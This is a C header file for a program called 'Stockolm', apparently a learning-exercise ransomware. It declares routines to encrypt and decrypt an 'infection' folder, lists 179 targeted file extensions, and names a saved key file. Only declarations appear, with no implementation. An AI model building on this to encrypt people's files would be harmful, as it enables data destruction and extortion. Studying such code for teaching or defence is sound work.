#include <unistd.h>
#include <ctype.h>
#include <pwd.h>

#include <string.h>
#include <bsd/string.h>

#include <sys/stat.h>
#include <dirent.h>
#include <openssl/rand.h>
#include <stdbool.h>

#include <fcntl.h>

#define	VERSION	"Stockolm, version 1.0"
#define	FOLDER	"infection"
#define	EXTENSION	".123 .3dm .3ds .3g2 .3gp .602 .7z .accdb .aes .ai .ARC .asc .asf .asm .asp .avi .backup .bak .bat .bmp .brd .bz2 .c .cgm .class .cmd .cpp .crt .cs .csr .csv .db .dbf .dch .der .dif .dip .djvu .doc .docb .docm .docx .dot .dotm .dotx .dwg .edb .eml .fla .flv .frm .gif .gpg .gz .h .hwp .ibd .iso .jar .java .jpeg .jpg .js .jsp .key .lay .lay6 .ldf .m3u .m4u .max .mdb .mdf .mid .mkv .mml .mov .mp3 .mp4 .mpeg .mpg .msg .myd .myi .nef .odb .odg .odp .ods .odt .onetoc2 .ost .otg .otp .ots .ott .p12 .PAQ .pas .pdf .pem .pfx .php .pl .png .pot .potm .potx .ppam .pps .ppsm .ppsx .ppt .pptm .pptx .ps1 .psd .pst .rar .raw .rb .rtf .sch .sh .sldm .sldm .sldx .slk .sln .snt .sql .sqlite3 .sqlitedb .stc .std .sti .stw .suo .svg .swf .sxc .sxd .sxi .sxm .sxw .tar .tbk .tgz .tif .tiff .txt .uop .uot .vb .vbs .vcd .vdi .vmdk .vmx .vob .vsd .vsdx .wav .wb2 .wk1 .wks .wma .wmv .xlc .xlm .xls .xlsb .xlsm .xlsx .xlt .xltm .xltx .xlw .zip "
#define	NB_EXT	179
#define	KEY_SIZE	32
#define	PATH_MAX	4096
#define	NAME_MAX	255
#define	SAVING_KEY_FILE	"Encryption_key.ft"


//printers.c
void	print_perror(const char *msg, const bool silent);
void	printf_error(const bool silent, const char *fmt, ...);
void	print_error(const char *msg, const bool silent);
void	print_msg(const bool silent, const char *fmt, ...);


int	folder_decryptage(char *path_to_folder, const unsigned char *key, const bool silent);

int	folder_cryptage(char *path_to_folder, const unsigned char *key, const bool silent);

char 			*base64_encode(const unsigned char *data, size_t input_length, size_t *output_length);
unsigned char	*base64_decode(const char *data, size_t input_length, size_t *output_length);